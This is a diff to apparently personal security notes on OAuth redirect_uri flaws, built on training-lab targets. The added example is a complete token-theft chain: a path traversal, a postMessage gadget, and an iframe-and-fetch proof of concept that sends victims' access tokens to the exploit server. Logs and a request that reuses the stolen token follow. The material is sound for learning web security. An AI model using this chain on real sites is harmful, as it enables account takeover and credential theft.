@@ -173,6 +173,8 @@ Once you identify which other pages you are able to set as the redirect URI, you
 
 One of the most useful vulnerabilities for this purpose is an [Open Redirection](Open%20Redirection.md). You can use this as a proxy to forward victims, along with their code or token, to an attacker-controlled domain where you can host any malicious script you like. Other good candidates are [Cross-Site Scripting (XSS)](Cross-Site%20Scripting%20(XSS).md), HTML injection and Dangerous JavaScript that handles query parameters and URL fragments.
 
+>[!example] Example 1 using open redirection
+
 Detected a page vulnerable to open redirection:
 ```http
 GET /post/next?path=https://foo.bar HTTP/2
@@ -235,6 +237,71 @@ Access-Control-Allow-Origin: https://0ac60016030f6c3d81b6da3400e900d1.web-securi
 Access-Control-Expose-Headers: WWW-Authenticate
 
 {"sub":"administrator","apikey":"S1A7R0ucaT9nJ3J3xE9I29EFbl3nInvi","name":"Administrator","email":"administrator@normal-user.net","email_verified":true}
+```
+
+>[!example] Example 2 using a path traversal and a Dangerous JavaScript gadget that handles query parameters
+>
+
+Discovered the `redirect_uri` parameter is vulnerable to path traversal:
+```http
+GET /auth?client_id=vezbo7n5myci2j8wvsgkh&redirect_uri=https://0a4400a404fbab3d800c80bf00c100d0.web-security-academy.net/foo&response_type=token&nonce=1682951592&scope=openid%20profile%20email HTTP/1.1
+Host: oauth-0a42003d046dab1680507e2d02380016.oauth-server.net
+
+
+HTTP/1.1 400 Bad Request
+
+---
+
+GET /auth?client_id=vezbo7n5myci2j8wvsgkh&redirect_uri=https://0a4400a404fbab3d800c80bf00c100d0.web-security-academy.net/oauth-callback/../foo&response_type=token&nonce=1682951592&scope=openid%20profile%20email HTTP/1.1
+Host: oauth-0a42003d046dab1680507e2d02380016.oauth-server.net
+
+
+HTTP/1.1 302 Found
+```
+
+Discovered a gadget which allows to leak the full URL to a parent windows and which can be embedded from any origin:
+```http
+GET /post/comment/comment-form
+Host: 0a4400a404fbab3d800c80bf00c100d0.web-security-academy.net
+
+
+HTTP/1.1 200 OK
+...
+<script>
+	parent.postMessage({type: 'onload', data: window.location.href}, '*')
+...
+```
+
+PoC:
+```html
+<!-- iframe performing the redirection to the gadget using the redirect_uri source -->
+<iframe src="https://oauth-0a42003d046dab1680507e2d02380016.oauth-server.net/auth?client_id=vezbo7n5myci2j8wvsgkh&redirect_uri=https://0a4400a404fbab3d800c80bf00c100d0.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=1947969098&scope=openid%20profile%20email"></iframe>
+
+<!-- script listening for messages and leaking the intercepted data -->
+<script>
+    window.addEventListener('message', function(e) {
+        fetch("/" + encodeURIComponent(e.data.data))
+    }, false)
+</script>
+```
+
+Leaked the access token and administrator data:
+```http
+Logs:
+...
+10.0.4.171      2023-06-30 11:52:06 +0000 "GET /exploit/ HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
+10.0.4.171      2023-06-30 11:52:07 +0000 "GET /https%3A%2F%2F0a4400a404fbab3d800c80bf00c100d0.web-security-academy.net%2Fpost%2Fcomment%2Fcomment-form%23access_token%3D2W3Q35rmXvGb84DMkIGQ3Rk9qXJ4c1cA4WM3m_RoIvT%26expires_in%3D3600%26token_type%3DBearer%26scope%3Dopenid%2520profile%2520email HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
+...
+
+
+GET /me HTTP/1.1
+Host: oauth-0a42003d046dab1680507e2d02380016.oauth-server.net
+Content-Type: application/json
+Authorization: Bearer 2W3Q35rmXvGb84DMkIGQ3Rk9qXJ4c1cA4WM3m_RoIvT
+
+
+HTTP/1.1 200 OK
+{"sub":"administrator","apikey":"yCYps7ZVmqsM5Bsc3Z5TOX7YXDzjNbs9","name":"Administrator","email":"administrator@normal-user.net","email_verified":true}
 ```
 
 ## Scope upgrade
